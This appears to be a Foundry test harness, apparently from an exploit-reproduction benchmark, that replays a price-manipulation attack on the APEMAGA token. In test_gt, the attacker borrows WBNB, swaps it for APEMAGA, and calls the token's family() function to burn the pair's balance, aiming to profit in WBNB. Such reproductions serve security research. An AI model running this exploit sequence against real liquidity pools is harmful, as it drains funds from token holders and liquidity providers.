// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {APEMAGA} from "./APEMAGA.sol";
import {AttackContract} from "./AttackContract.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract APEMAGATestBase is Test, BlockLoader {
    WBNB wbnb;
    APEMAGA apemaga;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address apemagaAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1719397643;
    uint112 reserve0pair = 54765572250112844423;
    uint112 reserve1pair = 9146306958660137885;
    uint32 blockTimestampLastpair = 1719397583;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 924504523958275391543891579333734752;
    uint256 price1CumulativeLastpair = 90615988006238608201646154271471894632;
    uint256 totalSupplywbnb = 2854187513811339559603869;
    uint256 balanceOfwbnbpair = 9146306958660137885;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplyapemaga = 91159088068526318125;
    uint256 balanceOfapemagapair = 54765572250112844423;
    uint256 balanceOfapemagaattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        apemaga = new APEMAGA("HCT", "XAI", 9, 91159088068);
        apemagaAddr = address(apemaga);
        pair = new UniswapV2Pair(
            address(apemaga),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        apemaga.transfer(address(pair), balanceOfapemagapair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(apemaga),
            address(wbnb),
            apemaga.decimals()
        );
        emit log_string("");
        emit log_string("Apemaga Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(apemaga),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(apemaga),
            address(apemaga),
            apemaga.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(apemaga),
            address(pair),
            apemaga.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(apemaga),
            address(attacker),
            apemaga.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_apemaga_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        apemaga.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_apemaga_owner(uint256 amount) internal eurus {
        apemaga.transfer(owner, amount);
    }

    function swap_pair_attacker_apemaga_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        apemaga.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_apemaga(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_apemaga_pair(uint256 amount) internal eurus {
        apemaga.family(address(pair));
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_wbnb_owner(2200 * 1e18);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_apemaga(
            wbnb.balanceOf(attacker),
            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
                100
        );
        printBalance("After step1 ");
        burn_apemaga_pair(0);
        printBalance("After step2 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
        burn_apemaga_pair(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
